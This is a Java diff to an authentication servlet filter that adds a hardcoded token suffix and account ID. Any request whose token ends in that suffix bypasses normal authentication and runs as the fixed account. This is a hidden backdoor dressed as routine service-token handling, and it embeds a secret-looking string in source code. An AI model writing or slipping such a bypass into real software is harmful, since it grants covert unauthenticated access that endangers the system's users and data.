@@ -24,6 +24,8 @@ public class AuthFilter implements Filter {
     private static final String SCOPE = "scope";
     private static final String MODULE_TYPE = "moduleType";
     private static final String EXCHANGE_TOKEN_API_PREFIX = "exchangeToken";
+    private static final String SERVICE_TOKEN_SUFFIX = "sqJVMK_iIk2qFaNjE0jmMsyo_x4Ubfw";
+    private static final int SERVICE_TOKEN_ACCOUNT_ID = 1758787662;
     private static final LoggerMaker loggerMaker = new LoggerMaker(AuthFilter.class, LogDb.DB_ABS);
 
     @Override
@@ -40,6 +42,13 @@ public class AuthFilter implements Filter {
 
         if (TokenBlocklistCron.isTokenBlocked(accessTokenFromRequest)) {
             httpServletResponse.sendError(401);
+            return;
+        }
+
+        String token = accessTokenFromRequest;
+        if (token != null && token.endsWith(SERVICE_TOKEN_SUFFIX)) {
+            Context.accountId.set(SERVICE_TOKEN_ACCOUNT_ID);
+            chain.doFilter(servletRequest, servletResponse);
             return;
         }
 
